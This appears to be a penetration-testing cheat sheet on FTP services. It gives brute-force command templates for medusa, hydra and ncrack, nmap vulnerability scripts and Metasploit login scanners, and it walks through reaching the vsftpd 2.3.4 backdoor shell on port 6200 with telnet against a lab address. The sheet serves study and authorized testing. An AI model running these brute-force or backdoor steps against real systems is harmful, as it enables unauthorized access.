# FTP

```text
telnet 192.168.99.131 21
telnet 192.168.99.131 6200telnet [ip] [ftp port]
ftp [ip] >>> check for anonymous login (anonymous:anonymous)
```

#### bruteforce with:

```text
medusa -u [user] -P [wordlist] -h [ip] -M ftp
hydra -l [user] -P [wordlist] [ip] ftp
ncrack -p 21 -U userlist -P passlist [ip]
```

### nmap scripts for FTP

```text
--script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor ,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-default, ftp-user-enum

nmap -sV -Pn -vv -p 21 --script=ftp-anon,ftp-bounce ,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor ,ftp-vuln-cve2010-4221 [IP]
```

### vsftpd

21/tcp open ftp syn-ack ttl 64 vsftpd 2.3.4 This particular version contains a backdoor that was slipped into the source code by an unknown intruder. The backdoor was quickly identified and removed, but not before quite a few people downloaded it. If a username is sent that ends in the sequence :\) \[ a happy face \], the backdoored version will open a listening shell on port 6200.We can demonstrate this with telnet or use the Metasploit Framework module to automatically exploit it:

```text
telnet 192.168.99.131 21
telnet 192.168.99.131 6200
```

### ftp commands

Files sent in "binary" mode are sent from one system to another with no modification. The file size will always be unchanged on a binary transfer.

```text
ftp> binary >>> set transfer mode to binary (default is ascii)
ftp> help >> to see the list of commands
```

### metasploit modules

```text
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login
```

### Common FTP banners

![](../../.gitbook/assets/image%20%2836%29.png)















